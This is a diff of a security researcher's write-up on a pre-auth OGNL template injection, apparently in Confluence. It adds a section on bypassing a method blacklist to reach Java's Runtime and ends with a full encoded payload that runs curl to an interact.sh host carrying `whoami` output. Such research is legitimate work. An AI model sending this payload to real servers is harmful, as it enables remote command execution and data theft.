@@ -153,7 +153,7 @@ Now should we try some Math operation ?.
 There we go :). Now we have our Pre-auth OGNL Injection :) .
 
 
-### Escalate the Template Injection.
+### Escalate the Template Injection and Bypass blacklist
 
 One of the most common technique to exploit Template Injection is climbing the object hierarchy. We climb up to the parent object, and then call java runtime environment to get RCE, sound easy right ?.
 
@@ -161,4 +161,18 @@ Usually, we will use `"".getClass()` to get instance of a class and then perform
 
 <img width="755" alt="image" src="https://user-images.githubusercontent.com/37280106/131948296-928062c9-ee78-4cbe-8426-0ae0d61db0cf.png">
 
-As you can see, all the unsafe methods and properties are blacklisted
+As you can see, all the unsafe methods and properties are blacklisted. 
+
+I'm not an expert in Java, I just read a lot of research and write-up from other famous researcher, I know Java has a long history of deserialization attack and bypass blacklisted methods to archive command execution. 
+
+At this point, I remember that Orange Tsai had some techniques to bypass the blacklist and he pointed out blacklist is a bad idea. So I revisit his [talk](https://www.youtube.com/watch?v=28xWcRegncw&t=2171s) 
+
+<img width="1348" alt="image" src="https://user-images.githubusercontent.com/37280106/131950579-ad4502a2-e92a-4356-8f11-101bc3d2bcc2.png">
+
+Does it look familiar with our blacklist here ?. The path is clear, we can use `""["class"].forName("java.lang.Runtime")` to access to instance of `Runtime` class and archieve command execution.
+
+Full payload (copied from [this write up](https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md]): 
+```
+aaa%5Cu0027%2B%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName%28%5Cu0022java.lang.Runtime%5Cu0022%29.getMethod%28%5Cu0022getRuntime%5Cu0022%2Cnull%29.invoke%28null%2Cnull%29.exec%28%5Cu0022curl%20c4rtfjeyedf00002t4zggncp83ryyyyyb.interact.sh%2F%60whoami%60%5Cu0022%29%7D%2B%5Cu0027
+```
+
